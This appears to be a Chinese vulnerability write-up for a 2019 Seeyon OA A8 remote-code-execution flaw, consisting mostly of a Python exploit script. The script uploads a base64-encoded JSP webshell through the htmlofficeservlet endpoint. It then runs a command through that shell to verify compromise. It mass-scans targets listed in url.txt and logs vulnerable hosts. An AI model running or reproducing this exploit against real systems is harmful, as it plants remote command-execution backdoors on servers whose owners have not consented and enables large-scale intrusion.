### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|seeyon_rce致远 OA A8 getshell_0day|2019-06-26|360-CERT|[http://www.skyworth.com/](http://www.seeyon.com/) | [http://www.seeyon.com/](http://www.seeyon.com/) | A8 V7.0 SP3/V6.1 SP2|[B6-2019-062601](https://cert.360.cn/warning/detail?id=d877451a4dbebd852d01e9730d762076)|  

### POC实现代码如下：  

```python
# Wednesday, 26 June 2019
# Author:nianhua
# Blog:https://github.com/nian-hua/
# python3 版本
 
import re
import requests
import base64
from multiprocessing import Pool, Manager
 
def send_payload(url):
 
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}
 
    payload = "REJTVEVQIFYzLjAgICAgIDM1NSAgICAgICAgICAgICAwICAgICAgICAgICAgICAgNjY2ICAgICAgICAgICAgIERCU1RFUD1PS01MbEtsVg0KT1BUSU9OPVMzV1lPU1dMQlNHcg0KY3VycmVudFVzZXJJZD16VUNUd2lnc3ppQ0FQTGVzdzRnc3c0b0V3VjY2DQpDUkVBVEVEQVRFPXdVZ2hQQjNzekIzWHdnNjYNClJFQ09SRElEPXFMU0d3NFNYekxlR3c0VjN3VXczelVvWHdpZDYNCm9yaWdpbmFsRmlsZUlkPXdWNjYNCm9yaWdpbmFsQ3JlYXRlRGF0ZT13VWdoUEIzc3pCM1h3ZzY2DQpGSUxFTkFNRT1xZlRkcWZUZHFmVGRWYXhKZUFKUUJSbDNkRXhReVlPZE5BbGZlYXhzZEdoaXlZbFRjQVRkTjFsaU40S1h3aVZHemZUMmRFZzYNCm5lZWRSZWFkRmlsZT15UldaZEFTNg0Kb3JpZ2luYWxDcmVhdGVEYXRlPXdMU0dQNG9FekxLQXo0PWl6PTY2DQo8JUAgcGFnZSBsYW5ndWFnZT0iamF2YSIgaW1wb3J0PSJqYXZhLnV0aWwuKixqYXZhLmlvLioiIHBhZ2VFbmNvZGluZz0iVVRGLTgiJT48JSFwdWJsaWMgc3RhdGljIFN0cmluZyBleGN1dGVDbWQoU3RyaW5nIGMpIHtTdHJpbmdCdWlsZGVyIGxpbmUgPSBuZXcgU3RyaW5nQnVpbGRlcigpO3RyeSB7UHJvY2VzcyBwcm8gPSBSdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKGMpO0J1ZmZlcmVkUmVhZGVyIGJ1ZiA9IG5ldyBCdWZmZXJlZFJlYWRlcihuZXcgSW5wdXRTdHJlYW1SZWFkZXIocHJvLmdldElucHV0U3RyZWFtKCkpKTtTdHJpbmcgdGVtcCA9IG51bGw7d2hpbGUgKCh0ZW1wID0gYnVmLnJlYWRMaW5lKCkpICE9IG51bGwpIHtsaW5lLmFwcGVuZCh0ZW1wKyJcbiIpO31idWYuY2xvc2UoKTt9IGNhdGNoIChFeGNlcHRpb24gZSkge2xpbmUuYXBwZW5kKGUuZ2V0TWVzc2FnZSgpKTt9cmV0dXJuIGxpbmUudG9TdHJpbmcoKTt9ICU+PCVpZigiYXNhc2QzMzQ0NSIuZXF1YWxzKHJlcXVlc3QuZ2V0UGFyYW1ldGVyKCJwd2QiKSkmJiEiIi5lcXVhbHMocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSl7b3V0LnByaW50bG4oIjxwcmU+IitleGN1dGVDbWQocmVxdWVzdC5nZXRQYXJhbWV0ZXIoImNtZCIpKSArICI8L3ByZT4iKTt9ZWxzZXtvdXQucHJpbnRsbigiOi0pIik7fSU+NmU0ZjA0NWQ0Yjg1MDZiZjQ5MmFkYTdlMzM5MGQ3Y2U="
 
    payload = base64.b64decode(payload)
 
    try:
 
        r = requests.post(url + '/seeyon/htmlofficeservlet', data=payload)
 
        r = requests.get(
            url + '/seeyon/test123456.jsp?pwd=asasd3344&cmd=cmd%20+/c+echo+wangming')
 
        if "wangming" in r.text:
 
            return url
 
        else:
 
            return 0
 
    except:
 
        return 0
 
def remove_control_chars(s):
    control_chars = ''.join(map(chr, list(range(0,32)) + list(range(127,160))))
    
    control_char_re = re.compile('[%s]' % re.escape(control_chars))
 
    s = control_char_re.sub('', s)
 
    if 'http' not in s:
 
        s = 'http://' + s
 
    return s
 
def savePeopleInformation(url, queue):
 
    newurl = send_payload(url)
 
    if newurl != 0:
 
        fw = open('loophole.txt', 'a')
        fw.write(newurl + '\n')
        fw.close()
 
    queue.put(url)
 
def main():
 
    pool = Pool(10)
 
    queue = Manager().Queue()
 
    fr = open('url.txt', 'r')
 
    lines = fr.readlines()
 
    for i in lines:
 
        url = remove_control_chars(i)
 
        pool.apply_async(savePeopleInformation, args=(url, queue,))
 
    allnum = len(lines)
 
    num = 0
 
    while True:
 
        print(queue.get())
 
        num += 1
 
        if num >= allnum:
 
            fr.close()
 
            break
 
if "__main__" == __name__:
 
    main()
```

